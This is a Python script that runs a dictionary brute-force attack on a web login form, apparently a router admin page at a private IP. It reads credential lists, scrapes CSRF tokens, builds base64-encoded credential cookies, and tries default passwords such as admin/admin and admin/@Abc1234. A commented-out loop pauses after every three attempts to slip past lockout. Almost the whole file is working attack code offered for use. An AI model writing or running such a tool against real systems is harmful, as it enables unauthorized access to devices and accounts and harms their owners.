import requests
from bs4 import BeautifulSoup
import argparse
import csv
import base64

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("-d", "--data-form", dest="data_form", help="Name of the username and password field in the data form")
arg_parser.add_argument("-u", "--url", dest="url", help="The login url to POST login requests to")
arg_parser.add_argument("--csv-dict", dest="csv_dict", help="The CSV dictionary for usernames and passwords")
arg_parser.add_argument("--txt-dict", dest="txt_dict", help="The txt dictionary for usernames and passwords")

args = arg_parser.parse_args()

usernames = list()
passwords = list()
credentials = list()

# print("Argument types:\ndata-form: {}\n".format(type(args.data_form))) 

# Opens the username and dictionary file for usernames and passwords
if args.csv_dict is None and args.txt_dict is None:
    print("Must provide a dictionary for brute forcing, either with --csv-dict or --txt-dict")
elif args.csv_dict is not None:
    with open(args.csv_dict, mode='r') as dict_file:
        csv_reader = csv.DictReader(dict_file)
        line_count = 0
        for row in csv_reader:
#            print("Column names are {}".format(",".join(row)))
            if line_count == 0:
                line_count += 1
                continue
            if "N/A" in row["Username"] or "BLANK" in row["Username"]:
                row["Username"] = ""
            if "N/A" in row["Password"] or "BLANK" in row["Password"]:
                row["Password"] = ""
            usernames.append(row["Username"])
            passwords.append(row["Password"])
            line_count += 1
        print("[*] Read CSV file, found {} usernames and {} passwords".format(len(usernames), len(passwords)))

elif args.txt_dict is not None:
    with open(args.txt_dict, mode='r') as dict_file:
        txt_reader = dict_file.readlines()
        for line in txt_reader:
            # usernames.append(line.strip().split(':')[0])
            # passwords.append(line.strip().split(':')[1])
            credentials.append(line.strip())

# Putting the name of the username and password data-form field supplied in the arguments into the data form
form_data = dict()
username_header = args.data_form.split(",")[0]
password_header = args.data_form.split(",")[1]
form_data[username_header] = ''
form_data[password_header] = ''

url = args.url

print("[*] Initiating the brute-force attack")
attemps = 0
# for x in usernames:
#     for y in passwords:
# for credential in credentials:
#         x = credential.split(':')[0]
#         y = credential.split(':')[1]
#         if attemps == 3:
#             time.sleep(180)
#             attemps = 0
#         form_data[username_header] = urllib.parse.quote(x)
#         form_data[password_header] = urllib.parse.quote(y)
#         print("[*] Testing {}:{}".format(x, y))
#         response = requests.post(url, data=form_data, verify=False)
#         print(response.url)
#         if ("login" not in str(response.content)):
#             print("^^^ We got something bois ^^^")
#         attemps += 1

headers = {
    "Cookie": "",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": 1,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://192.168.30.1/cgi-bin/login.asp",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
}
cookie = "SESSIONID=0c2e96e7"
CsrfToken = ""

response = requests.get(url, headers=headers, verify=False)
# print(response.text)
soup = BeautifulSoup(response.text, 'html.parser')
print(soup.contents)
hidden_inputs = soup.find_all("input", type="HIDDEN")
for hidden_input in hidden_inputs:
    if hidden_input.get("name") == "CsrfToken":
        CsrfToken = hidden_input.get("value")
# print(CsrfToken)
print("=====================")

form_data["StatusActionFlag"] = ""
form_data[username_header] = 'admin'
form_data[password_header] = 'admin'
form_data["CsrfToken"] = CsrfToken
base64_plain = "uid=" + form_data[username_header] + "; psw=" + form_data[password_header]

headers["Cookie"] = cookie + "; " + base64.b64encode(base64_plain.encode("ascii")).decode("ascii")
response = requests.post(url, data=form_data, headers=headers, verify=False)
print(response.request.headers)
print(response.request.body)
print("=====================")
print(response.text)
if ("login" not in str(response.text)):
    print("^^^ We got something bois ^^^")
else:
    soup = BeautifulSoup(response.text, 'html.parser')
    hidden_inputs = soup.find_all("input", type="HIDDEN")
    for hidden_input in hidden_inputs:
        if hidden_input.get("name") == "CsrfToken":
            CsrfToken = hidden_input.get("value")

print("=====================")
form_data["StatusActionFlag"] = ""
form_data[username_header] = "admin"
form_data[password_header] = "@Abc1234"
form_data["CsrfToken"] = CsrfToken
base64_plain = "uid=" + form_data[username_header] + "; psw=" + form_data[password_header]
headers["Cookie"] = cookie + "; " + base64.b64encode(base64_plain.encode("ascii")).decode("ascii")
response = requests.post(url, data=form_data, headers=headers, verify=False)
print(response.request.headers)
print(response.request.body)
print("=====================")
print(response.text)
if ("login" not in str(response.content)):
    print("^^^ We got something bois ^^^")
